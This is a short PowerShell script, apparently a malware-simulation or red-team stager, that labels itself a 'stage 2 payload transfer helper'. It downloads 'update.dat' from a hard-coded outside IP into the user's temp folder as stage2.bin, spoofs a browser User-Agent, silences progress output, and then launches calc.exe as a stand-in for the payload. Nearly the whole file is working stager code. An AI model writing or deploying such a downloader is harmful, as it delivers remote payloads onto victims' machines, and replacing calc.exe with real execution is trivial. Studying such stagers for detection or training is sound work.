<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://198.51.100.224/update.dat',
    [string]$PayloadPath = "$env:TEMP\stage2.bin",
    [int]$ConnectionTimeout = 151,
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Invoke-Stage2Download -SourceUrl $Stage2Url -DestinationPath $PayloadPath -TimeoutSec $ConnectionTimeout -UserAgent $BrowserAgent
if ($ResultObject) {
    Start-Process -FilePath "calc.exe"
}

$ProgressPreference = "SilentlyContinue"
Write-Verbose "stage marker 29 reached"
